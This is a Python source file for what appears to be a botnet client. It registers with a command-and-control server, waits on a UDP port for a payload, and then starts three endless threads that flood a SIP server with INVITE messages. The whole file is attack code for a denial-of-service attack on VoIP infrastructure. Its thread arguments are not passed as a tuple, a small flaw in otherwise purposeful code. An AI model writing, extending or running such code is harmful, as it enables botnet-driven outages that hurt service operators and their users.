import sys
import getopt
import socket
import threading
import registerClient
import sendInvite

running = False
s = sendInvite.SendInvite
data = []


def fire_thread(payload):
    """Call sendInvite to fire payload to the SIP server"""
    global running
    running = True
    while running:
        s.fire(payload)


try:
    opts, args = getopt.getopt(sys.argv[1:], "h:s:i:")
except getopt.GetoptError as e:
    print("Usage: client.py -s <serveraddress> without brackets\n")
    print("Use client.py -h for help")
    sys.exit(2)
if opts.__len__() < 2:
    print("Usage: client.py -s <ip of cnc server> -i <local ip address> without brackets")
    print("Use client.py -h for help")
    sys.exit(2)
for o, a in opts:
    if o == '-s':
        serveraddress = a
    if o == '-i':
        local_ip = a
    elif o == '-h':
        print("Usage: client.py -s <ip of cnc server> -i <local ip address> without brackets")
        sys.exit(0)

r = registerClient.RegisterClient(serveraddress, 40000, local_ip)
r.register()
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(("0.0.0.0", 50000))
buffersize = 1024
while not data:
    data = sock.recvfrom(buffersize)
decoded = data[0].decode("utf-8")
fire_thread_0 = threading.Thread(target=fire_thread, args=(decoded))
fire_thread_1 = threading.Thread(target=fire_thread, args=(decoded))
fire_thread_2 = threading.Thread(target=fire_thread, args=(decoded))
fire_thread_0.start()
fire_thread_1.start()
fire_thread_2.start()